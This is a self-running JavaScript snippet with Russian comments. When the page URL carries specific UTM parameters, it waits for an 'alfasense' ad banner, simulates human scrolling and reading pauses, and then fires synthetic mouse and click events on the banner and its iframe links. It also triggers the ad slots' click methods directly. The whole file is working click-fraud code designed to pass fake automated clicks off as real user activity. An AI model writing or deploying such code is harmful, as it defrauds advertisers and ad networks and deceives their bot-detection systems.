(function() {
    'use strict';
    
    function getUtmParams() {
        const urlParams = new URLSearchParams(window.location.search);
        return {
            source: urlParams.get('utm_source'),
            medium: urlParams.get('utm_medium'),
            campaign: urlParams.get('utm_campaign')
        };
    }
    
    function checkUtmConditions() {
        const utm = getUtmParams();
        return utm.source === 'google' && 
               utm.medium === 'organic' && 
               utm.campaign === 'promo';
    }
    
    async function waitForAlfasense() {
        return new Promise((resolve) => {
            let attempts = 0;
            const maxAttempts = 20; // 10 секунд
            
            const check = setInterval(() => {
                attempts++;
                
                // Проверяем разные признаки загрузки alfasense
                const alfasenseReady = (
                    (window.alfadart && window.alfadart.slots) ||
                    document.querySelector('iframe[src*="alfasense"]') ||
                    document.querySelector('div[id^="alfadart_"] iframe')
                );
                
                if (alfasenseReady) {
                    clearInterval(check);
                    resolve(true);
                } else if (attempts >= maxAttempts) {
                    clearInterval(check);
                    resolve(false);
                }
            }, 500);
        });
    }
    
    async function simulateHumanBehavior() {
        // Реалистичный скролл с остановками
        const scrollStep = () => {
            return new Promise((resolve) => {
                const currentScroll = window.scrollY;
                const targetScroll = Math.random() * document.body.scrollHeight;
                const step = (targetScroll - currentScroll) / 10;
                
                let steps = 0;
                const scrollInterval = setInterval(() => {
                    window.scrollBy(0, step);
                    steps++;
                    
                    if (steps >= 10) {
                        clearInterval(scrollInterval);
                        resolve();
                    }
                }, 100);
            });
        };
        
        await scrollStep();
        
        // Пауза как человек читает
        const pauseTime = 2000 + Math.random() * 4000;
        await new Promise(r => setTimeout(r, pauseTime));
        
        // Еще немного скролла
        window.scrollBy(0, 100 + Math.random() * 200);
        await new Promise(r => setTimeout(r, 500 + Math.random() * 1000));
    }
    
    // Основной метод клика - через эмуляцию реального пользователя
    async function performClick() {
        // Находим видимый баннер
        const bannerDiv = document.querySelector('div[id^="alfadart_"]');
        if (!bannerDiv) return false;
        
        // Ждем появления iframe внутри баннера
        await new Promise(r => setTimeout(r, 1000));
        
        const iframe = bannerDiv.querySelector('iframe');
        if (!iframe) return false;
        
        try {
            // Позиция баннера на странице
            const rect = bannerDiv.getBoundingClientRect();
            
            if (rect.width === 0 || rect.height === 0) return false;
            
            // Реальная эмуляция движения мыши
            const mouseMove = new MouseEvent('mousemove', {
                view: window,
                bubbles: true,
                cancelable: true,
                clientX: rect.left + rect.width / 2,
                clientY: rect.top + rect.height / 2
            });
            
            document.dispatchEvent(mouseMove);
            
            await new Promise(r => setTimeout(r, 200 + Math.random() * 300));
            
            // Эмуляция наведения
            const mouseOver = new MouseEvent('mouseover', {
                view: window,
                bubbles: true,
                cancelable: true,
                clientX: rect.left + rect.width / 2,
                clientY: rect.top + rect.height / 2
            });
            
            bannerDiv.dispatchEvent(mouseOver);
            
            await new Promise(r => setTimeout(r, 100 + Math.random() * 200));
            
            // Эмуляция клика
            const clickEvent = new MouseEvent('click', {
                view: window,
                bubbles: true,
                cancelable: true,
                clientX: rect.left + rect.width / 2,
                clientY: rect.top + rect.height / 2
            });
            
            bannerDiv.dispatchEvent(clickEvent);
            
            // Также пробуем найти ссылку внутри iframe
            try {
                if (iframe.contentWindow) {
                    const links = iframe.contentDocument.querySelectorAll('a');
                    if (links.length > 0) {
                        links[0].click();
                    }
                }
            } catch (e) {
                // Cross-origin, игнорируем
            }
            
            return true;
            
        } catch (e) {
            console.error('Ошибка клика:', e);
            return false;
        }
    }
    
    async function executeBannerClick() {
        if (!checkUtmConditions()) {
            console.log('UTM не совпадают - пропускаем');
            return;
        }
        
        console.log('UTM совпадают, инициируем клик...');
        
        const alfasenseReady = await waitForAlfasense();
        if (!alfasenseReady) {
            console.log('Alfasense не загрузился');
            return;
        }
        
        await simulateHumanBehavior();
        
        const clicked = await performClick();
        
        if (clicked) {
            console.log('✅ Клик выполнен успешно');
            
            // Дополнительно: пробуем прямой переход через API alfasense
            setTimeout(() => {
                if (window.alfadart && window.alfadart.slots) {
                    window.alfadart.slots.forEach(slot => {
                        if (slot.click) slot.click();
                    });
                }
            }, 500);
        } else {
            console.log('❌ Не удалось кликнуть');
        }
    }
    
    if (document.readyState === 'complete') {
        executeBannerClick();
    } else {
        window.addEventListener('load', executeBannerClick);
    }
})();
